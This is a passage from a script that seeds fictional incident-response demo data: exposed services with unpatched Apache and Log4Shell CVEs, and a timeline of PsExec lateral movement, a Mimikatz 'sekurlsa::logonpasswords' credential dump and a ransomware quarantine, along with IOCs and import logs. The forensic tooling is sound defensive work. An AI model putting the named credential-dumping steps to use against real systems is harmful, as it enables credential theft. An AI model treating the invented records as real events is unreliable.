        provider: "Shodan",
        exposedServices: [
          { port: 25,   protocol: "SMTP",  banner: "Postfix smtpd; no TLS required" },
          { port: 8080, protocol: "HTTP",  banner: "Apache/2.4.49 — CVE-2021-41773 unauthenticated path traversal/RCE (mod_cgi); CVSS 9.8; unpatched" },
          { port: 8443, protocol: "HTTPS", banner: "Apache Tomcat/9.0.53 + Log4j 2.14.1 — CVE-2021-44228 Log4Shell JNDI RCE; CVSS 10.0; unpatched" },
          { port: 3389, protocol: "RDP",   banner: "Terminal Services; exposed to internet" },
        ],
        summary: "4 exposed services: SMTP (no-TLS), Apache 2.4.49 (CVE-2021-41773 RCE unpatched), Tomcat (CVE-2021-44228 Log4Shell unpatched), RDP (internet-facing)",
      },
    ],
  });

  // ── synth-meta.json ────────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "synth-meta.json"), {
    lastSynthesizedAt: "2026-05-22T11:00:00.000Z",
    lastDiff: {
      added: ["f001", "f002", "f003", "f004", "f005", "f006", "f007", "f008"],
      removed: [],
      severityChanged: [],
    },
  });

  // ── import-meta.json ───────────────────────────────────────────────────────
  await write(join(CASE_DIR, "state", "import-meta.json"), {
    lastImportedAt: "2026-05-22T10:30:00.000Z",
    lastImportKind: "chainsaw",
    lastImportFile: "dc01-evtx-chainsaw.json",
    addedCount: 19,
    removedCount: 2,
    lastDiff: {
      added: [
        { timestamp: ts(16, 8, 22), description: "PsExec lateral movement to DC01", severity: "Critical" },
        { timestamp: ts(16, 8, 23), description: "PSEXESVC service installed on DC01", severity: "Critical" },
        { timestamp: ts(16, 8, 43), description: "Mimikatz uploaded to DC01 C:\\Windows\\Temp\\m64.exe", severity: "Critical" },
        { timestamp: ts(16, 8, 45), description: "Mimikatz sekurlsa::logonpasswords executed on DC01", severity: "Critical" },
        { timestamp: ts(19, 22, 17), description: "CrowdStrike quarantined encrypt.exe on DC01 and WEB01", severity: "High" },
      ],
      removed: [
        { timestamp: ts(15, 10, 0), description: "Routine Windows Defender definition update", severity: "Info" },
        { timestamp: ts(16, 7, 30), description: "Scheduled backup task completed normally", severity: "Info" },
      ],
    },
    iocsAddedCount: 5,
    iocsRemovedCount: 0,
    iocsDiff: {
      added: [
        { value: SHA_MIMIKATZ,                          type: "hash" },
        { value: "c:\\windows\\temp\\m64.exe",          type: "file" },
        { value: "dc01.globaltech.local",               type: "other" },
        { value: "10.10.20.15",                         type: "ip" },
        { value: "PSEXESVC.exe",                        type: "process" },
      ],
      removed: [],
    },
  });

  // ── metadata/captures.jsonl ────────────────────────────────────────────────
  const captures = [
    { caseId: CASE_ID, sequenceNumber: 1, timestamp: "2026-05-22T09:00:00.000Z", url: "about:newtab",                                  tabTitle: "New Tab",                    triggerType: "timer",      contentHash: "0000000000000000", isDuplicate: false, screenshotFile: "000001_2026-05-22T09:00:00.000Z_New-Tab.webp" },
    { caseId: CASE_ID, sequenceNumber: 2, timestamp: "2026-05-22T09:05:00.000Z", url: "http://localhost:4773/dashboard",               tabTitle: "DFIR Companion",             triggerType: "navigation", contentHash: "fea4b2c81e3d5f70", isDuplicate: false, screenshotFile: "000002_2026-05-22T09:05:00.000Z_DFIR-Companion.webp" },
    { caseId: CASE_ID, sequenceNumber: 3, timestamp: "2026-05-22T09:30:00.000Z", url: "https://www.virustotal.com/gui/ip-address/185.220.101.47", tabTitle: "VirusTotal — 185.220.101.47",  triggerType: "navigation", contentHash: "a1b2c3d4e5f60718", isDuplicate: false, screenshotFile: "000003_2026-05-22T09:30:00.000Z_VirusTotal.webp" },
    { caseId: CASE_ID, sequenceNumber: 4, timestamp: "2026-05-22T10:00:00.000Z", url: "http://localhost:4773/dashboard",               tabTitle: "DFIR Companion",             triggerType: "timer",      contentHash: "fea4b2c81e3d5f72", isDuplicate: false, screenshotFile: "000004_2026-05-22T10:00:00.000Z_DFIR-Companion.webp" },
    { caseId: CASE_ID, sequenceNumber: 5, timestamp: "2026-05-22T10:30:00.000Z", url: "http://localhost:4773/dashboard",               tabTitle: "DFIR Companion",             triggerType: "tab_switch", contentHash: "fea4b2c81e3d5f74", isDuplicate: false, screenshotFile: "000005_2026-05-22T10:30:00.000Z_DFIR-Companion.webp" },
  ];
  const capturesLog = captures.map((c) => JSON.stringify(c)).join("\n") + "\n";
  await writeFile(join(CASE_DIR, "metadata", "captures.jsonl"), capturesLog, "utf8");

  // ── metadata/imports.jsonl ─────────────────────────────────────────────────
  const imports = [
    { caseId: CASE_ID, sequenceNumber: 1, importedAt: "2026-05-22T10:00:00.000Z", filename: "thor-wkstn-jsmith.json",     originalName: "thor_scan_WKSTN-JSMITH.json", rows: 87,  bytes: 134500 },
    { caseId: CASE_ID, sequenceNumber: 2, importedAt: "2026-05-22T10:05:00.000Z", filename: "suricata-eve-may15-22.json", originalName: "suricata_eve.json",           rows: 312, bytes: 891200 },
    { caseId: CASE_ID, sequenceNumber: 3, importedAt: "2026-05-22T10:10:00.000Z", filename: "crowdstrike-siem-export.json", originalName: "cs_siem_export_may22.json", rows: 204, bytes: 520000 },
    { caseId: CASE_ID, sequenceNumber: 4, importedAt: "2026-05-22T10:30:00.000Z", filename: "dc01-evtx-chainsaw.json",    originalName: "DC01_chainsaw_hunt.json",     rows: 143, bytes: 287000 },
  ];
  const importsLog = imports.map((i) => JSON.stringify(i)).join("\n") + "\n";
  await writeFile(join(CASE_DIR, "metadata", "imports.jsonl"), importsLog, "utf8");

  // ── done ───────────────────────────────────────────────────────────────────
  console.log(`\nDemo case "${CASE_ID}" created successfully.`);
  console.log(`  Path: ${CASE_DIR}`);
  console.log(`  Findings:       ${investigation.findings.length}  (3 Critical, 2 High, 2 Medium, 1 Low, 1 Info)`);
  console.log(`  IOCs:           ${investigation.iocs.length}  (IPs, domains, hashes, files, processes, URLs, CVE vulnerabilities)`);
  console.log(`  Forensic events:${investigation.forensicTimeline.length} (Critical→Info, evidence chain, CVE exploitation events)`);
  console.log(`  MITRE:          ${investigation.mitreTechniques.length} techniques`);
  console.log(`  Threads:        ${investigation.openThreads.length}  (2 open, 1 closed)`);
  console.log(`  Key questions:  ${investigation.keyQuestions.length}  (answered/partial/unknown)`);
  console.log(`  Next steps:     ${investigation.nextSteps.length}  (critical→medium)`);
  console.log(`  Tags:           17 triage tags across IOCs, events, findings`);
  console.log(`  Comments:       6 analyst comments`);
  console.log(`  Report meta:    fully populated (org, revisions, distribution, sections)`);
  console.log(`  Customer data:  3 email checks + 1 domain Shodan scan`);
  console.log(`\nStart the server and open the dashboard, then connect to case "${CASE_ID}".`);
  console.log(`  npm run dev`);
}

main().catch((e) => { console.error("seed-demo-case error:", e); process.exit(1); });
